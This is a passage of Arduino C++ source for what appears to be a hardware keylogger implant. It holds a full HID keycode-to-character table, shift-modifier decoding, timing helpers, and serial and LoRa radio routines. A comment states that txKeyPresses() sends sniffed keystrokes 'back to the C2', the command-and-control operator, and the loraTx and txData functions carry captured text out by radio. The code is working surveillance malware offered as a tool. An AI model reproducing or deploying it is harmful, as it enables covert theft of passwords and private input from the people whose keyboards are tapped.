    case 1:
      return "[Key1NotFound]";
    case 2:
      return "[Key2NotFound]";
    case 3:
      return "[Key3NotFound]";
    case 4:
      return "a";
    case 5:
      return "b";
    case 6:
      return "c";
    case 7:
      return "d";
    case 8:
      return "e";
    case 9:
      return "f";
    case 10:
      return "g";
    case 11:
      return "h";
    case 12:
      return "i";
    case 13:
      return "j";
    case 14:
      return "k";
    case 15:
      return "l";
    case 16:
      return "m";
    case 17:
      return "n";
    case 18:
      return "o";
    case 19:
      return "p";
    case 20:
      return "q";
    case 21:
      return "r";
    case 22:
      return "s";
    case 23:
      return "t";
    case 24:
      return "u";
    case 25:
      return "v";
    case 26:
      return "w";
    case 27:
      return "x";
    case 28:
      return "y";
    case 29:
      return "z";
    case 30:
      return "1";
    case 31:
      return "2";
    case 32:
      return "3";
    case 33:
      return "4";
    case 34:
      return "5";
    case 35:
      return "6";
    case 36:
      return "7";
    case 37:
      return "8";
    case 38:
      return "9";
    case 39:
      return "0";
    case 40:
      return "[ENTER]"; //Enter
    case 41:
      return "[ESC]";
    case 42:
      return "[BKSPC]";
    case 43:
      return "[TAB]";
    case 44:
      return " "; //Spacebar
    case 45:
      return "-";
    case 46:
      return "=";
    case 47:
      return "[";
    case 48:
      return "]";
    case 49:
      return "'\'";
    case 50:
      return "[Key50NotMapped]";
    case 51:
      return ";";
    case 52:
      return "'";
    case 53:
      return "`";
    case 54:
      return ",";
    case 55:
      return ".";
    case 56:
      return "/";
    case 57:
      return "[CAPSLOCK]";
    case 58:
      return "[F1]";
    case 59:
      return "[F2]";
    case 60:
      return "[F3]";
    case 61:
      return "[F4]";
    case 62:
      return "[F5]";
    case 63:
      return "[F6]";
    case 64:
      return "[F7]";
    case 65:
      return "[F8]";
    case 66:
      return "[F9]";
    case 67:
      return "[F10]";
    case 68:
      return "[F11]";
    case 69:
      return "[F12]";
    case 70:
      return "[PRNT_SCRN]";
    case 71:
      return "[SCRN_LCK]";
    case 72:
      return "[Key72NotMapped]";
    case 73:
      return "[INS]";
    case 74:
      return "[HOME]";
    case 75:
      return "[PG_UP]";
    case 76:
      return "[DEL]";
    case 77:
      return "[END]";
    case 78:
      return "[PG_DN]";
    case 79:
      return "[ARW_R]";
    case 80:
      return "[ARW_L]";
    case 81:
      return "[ARW_D]";
    case 82:
      return "[ARW_U]";
    case 83:
      return "[NUM_LCK]";
    case 84:
      return "[Key84NotMapped]";
    case 85:
      return "[Key85NotMapped]";
    case 86:
      return "[Key86NotMapped]";
    case 87:
      return "[Key87NotMapped]";
    case 88:
      return "[Key88NotMapped]";
    case 89:
      return "[Key89NotMapped]";
    case 90:
      return "[Key90NotMapped]";
    case 91:
      return "[Key91NotFound]";
    case 92:
      return "[Key92NotFound]";
    case 93:
      return "[Key93NotFound]";
    case 94:
      return "[Key94NotFound]";
    case 95:
      return "[Key95NotFound]";
    case 96:
      return "[Key96NotFound]";
    case 97:
      return "[Key97NotFound]";
    case 98:
      return "[Key98NotFound]";
    case 99:
      return "[Key99NotFound]";
    case 100:
      return "[Key100NotFound]";
    case 101:
      return "[RT_GUI]";
    case 102:
      return "[Key102NotFound]";
    case 103:
      return "[Key103NotFound]";
    case 104:
      return "A";
    case 105:
      return "B";
    case 106:
      return "C";
    case 107:
      return "D";
    case 108:
      return "E";
    case 109:
      return "F";
    case 110:
      return "G";
    case 111:
      return "H";
    case 112:
      return "I";
    case 113:
      return "J";
    case 114:
      return "K";
    case 115:
      return "L";
    case 116:
      return "M";
    case 117:
      return "N";
    case 118:
      return "O";
    case 119:
      return "P";
    case 120:
      return "Q";
    case 121:
      return "R";
    case 122:
      return "S";
    case 123:
      return "T";
    case 124:
      return "U";
    case 125:
      return "V";
    case 126:
      return "W";
    case 127:
      return "X";
    case 128:
      return "Y";
    case 129:
      return "Z";
    case 130:
      return "!";
    case 131:
      return "@";
    case 132:
      return "#";
    case 133:
      return "$";
    case 134:
      return "%";
    case 135:
      return "^";
    case 136:
      return "&";
    case 137:
      return "*";
    case 138:
      return "(";
    case 139:
      return ")";
    case 140:
      return "[Key140NotMapped]";
    case 141:
      return "[Key141NotMapped]";
    case 142:
      return "[Key142NotMapped]";
    case 143:
      return "[Key143NotMapped]";
    case 144:
      return "[Key144NotMapped]";
    case 145:
      return "_";
    case 146:
      return "+";
    case 147:
      return "{";
    case 148:
      return "}";
    case 149:
      return "'|'";
    case 150:
      return "[Key150NotMapped]";
    case 151:
      return ":";
    case 152:
      return "\"";
    case 153:
      return "~";
    case 154:
      return "<";
    case 155:
      return ">";
    case 156:
      return "?";
    default:
      return "[KeyNotFound]";
      break;
  }
}

bool arrayContains(byte in, byte arrayCount){
  String old = "";
  for (byte z = 0; z < arrayCount; z++){
    old.concat(String(oldKeys[z]) + " ");
  }
  Serial.print("Array Size is: "); Serial.println(arrayCount);
  Serial.print("Input is: "); Serial.println(in);
  Serial.print("Array to compare is: "); Serial.println(old);
  for (byte k = 1; k < arrayCount; k++){
    Serial.print("K value: "); Serial.println(k);
    if (oldKeys[k] == in){
      Serial.print(oldKeys[k]); Serial.println(" is in the array");
      return true;
    } else {
      Serial.print(oldKeys[k]); Serial.println(" is not in the array");
    }
  }
  return false;
}

bool getShift(byte m){
  bool output = false;
  if (m > 64){
    m = m - 64;
  }
  else if (m == 64){
    m = m - 64;
  }
  if (m > 32){
    output = true;
    m = m - 32;
  }
  else if (m == 32) {
    output = true;
    m = m - 32;
  }
  if (m > 16) {
    m = m - 16;
  }
  else if (m == 16){
    m = m - 16;
  }
  if (m > 8) {
    m = m - 8;
  }
  else if (m == 8) {
    m = m - 8;
  }
  if (m > 4) {
    m = m - 4;
  }
  else if (m == 4) {
    m = m -4;
  }
  if (m > 2) {
    output = true;
    m = m - 2;
  }
  else if (m == 2) {
    output = true;
    m = m - 2;
  }
  return output;  
}

//
// txKeyPresses() sends keystrokes back to the C2 as they are observed when sniffing keystrokes mode is enabled
//
void txKeyPresses(byte txArray[81], byte count){
  byte modVal = 0;
  String message = "";
  message.concat(getMod(txArray[0]));
  if (getShift(txArray[0])){
    modVal = 100;
  }
  for(byte i = 1; i < count; i++){
    byte keyVal = modVal + txArray[i];
    message.concat(getKeys(keyVal));
  }
 // return message;
  if (message != ""){
    if (txArray[1] != 0) {
      Serial.print("Sending: ");Serial.println(message);
      txData(message);
      Serial1.flush();
    }
  }
}


String getTimer(){
  String elapsedTime = "";
  currentMillis = millis();
  elapsedMillis = (currentMillis - startMillis);
  unsigned long remainingTime = elapsedMillis;
  Serial.print("Remaining Time value: "); Serial.println(remainingTime);
  unsigned long durH = (remainingTime/(3600000)); //Elapsed Hours
  Serial.print("durH value: "); Serial.println(durH);
  remainingTime = remainingTime-(durH*3600000); //remove hours from elapsed time
  Serial.print("Remaining Time value: "); Serial.println(remainingTime);
  unsigned long durM = (remainingTime/(60000)); //Elapsed minutes
  Serial.print("durM value: "); Serial.println(durM);
  remainingTime = remainingTime-(durM*60000); //removed minutes from elapsed time
  Serial.print("Remaining Time value: "); Serial.println(remainingTime);
  unsigned long durS = (remainingTime/1000); //Elapsed seconds  
  Serial.print("durS value: "); Serial.println(durS);
  remainingTime = remainingTime-(durS*1000); //remove seconds from elapsed time
  Serial.print("Remaining Time value: "); Serial.println(remainingTime);
  unsigned long durMS = (remainingTime); //time left is elapsed milliseconds  
  Serial.print("durMS value: "); Serial.println(durMS);
  Serial.print("Elapsed millis value: "); Serial.println(elapsedMillis);
  elapsedTime = timeMillis(durH,durM,durS,durMS);
  return elapsedTime;
}

String timeMillis(unsigned long timeH, unsigned long timeM, unsigned long timeS, unsigned long timeMS){
  String tempTime = "";
  if (timeH < 10) {
    tempTime = tempTime + "0" + String(timeH) + "h:";
  }
  else{
    tempTime = tempTime + String(timeH) + "h:";
  }

  if (timeM < 10) {
    tempTime = tempTime + "0" + String(timeM) + "m:";
  }
  else{
    tempTime = tempTime + String(timeM) + "m:";
  }

  if (timeS < 10) {
    tempTime = tempTime + "0" + String(timeS) + "s:";
  }
  else{
    tempTime = tempTime + String(timeS) + "s:";
  }

  if (timeMS < 10) {
    tempTime = tempTime + "0" + String(timeMS) + "ms";
  }
  else{
    tempTime = tempTime + String(timeMS) + "ms";
  }

  tempTime = "Last key press: " + String(tempTime);
  return tempTime;
}

void loraTx(int id, String payload){
  //add 4 extra for \r\n at the end of the payload
  int length = int(payload.length());
  String data = "AT+SEND=";
  data += id;
  data.concat(',');
  data += String(length);
  data.concat(',');
  data += payload;
  Serial.print("TX message is: ");
  Serial.println(data);
  Serial1.print(data+"\r\n");
  while (true){
    if (Serial1.available()){
      String msg = Serial1.readString();
      Serial.print("Return Code: ");
      Serial.print(msg);
      if (msg == "+OK\r\n"){
        break;
      }
    }
  }
}

void txData(String payload){
  if (setLoRa){
    loraTx(loraTargetID, payload);
  } else {
    Serial1.print(payload);
  }
}

String loraRxData (String loraMessage){
  int startIndex = loraMessage.indexOf(',');
  int endIndex = loraMessage.lastIndexOf(',');
  String sub = loraMessage.substring(startIndex+1, endIndex);
  startIndex = sub.indexOf(',');
  endIndex = sub.lastIndexOf(',');
  return sub.substring(startIndex+1, endIndex);
}

String rxData(String incomingMessage){
  String rxSub = incomingMessage.substring(1, 4);
  //Serial.print("Substring: ");
  //Serial.println(rxSub);
  if (rxSub == "RCV"){
    setLoRa=true;
    Serial.println("LoRa message detected");
  } else {
    setLoRa=false;
  }
  if (setLoRa){
    return loraRxData(incomingMessage);
  } else {
    return incomingMessage;
  }
}
